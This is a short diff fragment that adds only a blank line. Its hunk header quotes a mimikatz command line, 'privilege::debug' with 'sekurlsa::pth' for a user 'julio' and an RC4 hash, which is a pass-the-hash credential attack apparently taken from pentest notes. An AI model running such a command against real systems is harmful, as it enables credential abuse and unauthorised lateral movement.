@@ -9,3 +9,4 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 
 
 
+
